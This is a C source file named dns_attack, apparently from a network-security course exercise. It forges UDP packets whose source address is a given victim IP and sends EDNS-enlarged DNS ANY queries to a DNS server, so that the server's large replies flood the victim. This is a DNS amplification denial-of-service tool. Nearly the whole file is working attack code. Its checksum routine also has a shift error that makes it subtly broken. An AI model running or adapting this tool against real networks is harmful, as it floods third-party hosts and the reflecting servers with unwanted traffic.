#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "dns_attack.h"

void print_err(char *msg);
unsigned short csum(unsigned short *ptr, int nbytes);
void dns_send(char *vctm_ip, int src_p, char *dns_ip, int dns_p, unsigned char *record, int q_type);

void dns_hdr_create(dns_hdr *dnsh);
void dns_format(unsigned char *dns, unsigned char *host);
void edns_hdr_create(edns_hdr *ednsh);
void ip_hdr_create(ip_hdr *iph, char *vctm_ip, char *dns_ip, unsigned char *dns_name, char *datagram);
void udp_hdr_create(udp_hdr *udph, int src_p, int dst_p, unsigned char *dns_name);

#define T_A 0x0001
#define T_NS 0x0002
#define T_CNAME 0x0005
#define T_SOA 0x0006
#define T_PTR 0x0008
#define T_MX 0x000f
#define T_ANY 0x00ff

int main(int argc, char *argv[]) {
  if(getuid() != 0) print_err("Must be running as ROOT.");
  if(argc != 4) print_err("Usage: ./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>");

  char *vctm_ip = argv[1];
  int src_p = atoi(argv[2]);
  char *dns_ip = argv[3];

  char search_name[16];
  /*
  printf("Input the name you want to search: ");
  scanf("%s", search_name);
  printf("Searching for %s.\n", search_name);
  dns_send(vctm_ip, src_p, dns_ip, 53, search_name, T_ANY);
  */
  dns_send(vctm_ip, src_p, dns_ip, 53, "www.google.com", T_ANY);
  dns_send(vctm_ip, src_p, dns_ip, 53, "amazon.com", T_ANY);
  dns_send(vctm_ip, src_p, dns_ip, 53, "ieee.org", T_ANY);
}

void print_err(char *msg) {
  printf("%s\n",msg);
  exit(1);
}

unsigned short csum(unsigned short *ptr, int nbytes) {
  register long sum;
  unsigned short oddbyte;
  register short answer;

  sum = 0;
  while(nbytes > 1) {
    sum += *ptr++;
    nbytes -= 2;
  }
  if(nbytes == 1) {
    oddbyte = 0;
    *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
    sum += oddbyte;
  }
  
  sum = (sum > 16) + (sum & 0xffff);
  sum = sum + (sum >> 16);
  answer = (short)~sum;

  return(answer);
}

void dns_send(char *vctm_ip, int src_p, char *dns_ip, int dns_p, unsigned char *record, int q_type) {
  unsigned char dns_data[160];
  unsigned char *dns_name, dns_rcrd[32];

  /*=== DNS HEADER ===*/
  dns_hdr *dnsh = (dns_hdr *)&dns_data;
  dns_hdr_create(dnsh);
  
  /*=== DNS QUESTION ===*/
  dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)];
  strcpy(dns_rcrd, record);
  dns_format(dns_name, dns_rcrd);
 
  /*=== DNS Query ===*/
  query *q = (query *)&dns_data[sizeof(dns_hdr) + (strlen(dns_name)+1)];
  q->q_type = htons(q_type); // any
  q->q_class = htons(0x1);

  /*=== EDNS record ===*/
  edns_hdr *ednsh = (edns_hdr *)&dns_data[sizeof(dns_hdr) + strlen(dns_name)+1 + sizeof(query) + 1];
  edns_hdr_create(ednsh);

  char datagram[4096], *data, *psgram;

  memset(datagram, 0, 4096);

  data = datagram + sizeof(ip_hdr) + sizeof(udp_hdr);
  memcpy(data, &dns_data, sizeof(dns_hdr) + (strlen(dns_name)+1)+ sizeof(query) + sizeof(edns_hdr) + 1);

  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(dns_p);
  sin.sin_addr.s_addr = inet_addr(dns_ip);

  /*=====  IP HEADER =====*/
  ip_hdr *iph = (ip_hdr *)datagram;
  ip_hdr_create(iph, vctm_ip, dns_ip, dns_name, datagram);
  /*=====  UDP HEADER  =====*/
  udp_hdr *udph = (udp_hdr *)(datagram + sizeof(ip_hdr));
  udp_hdr_create(udph, src_p, 53, dns_name);

  // calculate udp checksum
  ps_hdr pshdr;
  pshdr.saddr = inet_addr(vctm_ip);
  pshdr.daddr = sin.sin_addr.s_addr;
  pshdr.filler = 0;
  pshdr.protocol = IPPROTO_UDP;
  pshdr.len = htons(sizeof(udp_hdr) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query) + sizeof(edns_hdr) + 1);

  int pssize = sizeof(ps_hdr) + sizeof(udp_hdr) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query) + sizeof(edns_hdr) + 1;
  psgram = malloc(pssize);

  memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr));
  memcpy(psgram + sizeof(ps_hdr), udph, sizeof(udp_hdr) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query) + sizeof(edns_hdr) + 1);

  udph->uh_sum = csum((unsigned short *)psgram, pssize);
  
  /*===== Send data =====*/
  int sock_r = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if(sock_r == -1) print_err("Could not create socket.");
  else sendto(sock_r, datagram, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));
  
  printf("DNS query has sent\n");

  free(psgram);
  close(sock_r);

  return; 
}

void dns_hdr_create(dns_hdr *dnsh) {
  dnsh->dns_id = (unsigned short) htons(0x671D); // 0616221

  dnsh->dns_tc = 0;           // not truncated
  dnsh->dns_aa = 0;           // not authoritative           
  dnsh->dns_qr = 0;           // query
  dnsh->dns_rd = 1;           // recursion desird
  dnsh->dns_opcode = 0;       // standard query

  dnsh->dns_rcode = 0;
  dnsh->dns_cd = 0;
  dnsh->dns_ad = 0;
  dnsh->dns_z = 0;
  dnsh->dns_ra = 0;           // recursion not available

  dnsh->dns_q_count = htons(1); // one query
  dnsh->dns_ans_count = 0;
  dnsh->dns_auth_count = 0;  // no authority entries
  dnsh->dns_add_count = htons(1);    // additional record count
}

void dns_format(unsigned char *dns, unsigned char *host) {
  int lock = 0, i;
  strcat((char*)host,".");

  for(i = 0; i < strlen((char*)host); i++) {
    if(host[i]=='.') {
      *dns++ = i-lock;
      for(;lock<i;lock++) {
        *dns++=host[lock];
      }
      lock++;
    }
  }
  *dns++=0x00;
}

void edns_hdr_create(edns_hdr *ednsh) {
  ednsh->edns_type = htons(41);
  ednsh->edns_class = htons(4096);
  ednsh->edns_ttl = 0x00800000;
  ednsh->edns_rdlen = 0;
  ednsh->edns_opcode = 0;
  ednsh->edns_oplen = 0;
  ednsh->edns_opdata = 0;
}

void ip_hdr_create(ip_hdr *iph, char *vctm_ip, char *dns_ip, unsigned char *dns_name, char *datagram) {
  iph->ip_v = 4;
  iph->ip_hl = 5;
  iph->ip_tos = 0;
  iph->ip_len = sizeof(ip_hdr) + sizeof(udp_hdr) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query) + 1 + sizeof(edns_hdr);
  iph->ip_id = htons(getpid());
  iph->ip_off = 0;
  iph->ip_ttl = 64;
  iph->ip_p = IPPROTO_UDP;
  iph->ip_sum = csum((unsigned short *)datagram, iph->ip_len);
  inet_aton(vctm_ip, &iph->ip_src);
  inet_aton(dns_ip, &iph->ip_dst);
}

void udp_hdr_create(udp_hdr *udph, int src_p, int dst_p, unsigned char *dns_name) {
  udph->uh_sport = htons(src_p);
  udph->uh_dport = htons(dst_p);
  udph->uh_ulen = htons(sizeof(udp_hdr) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query) + 1 + sizeof(edns_hdr)) ;
  udph->uh_sum = 0;
}
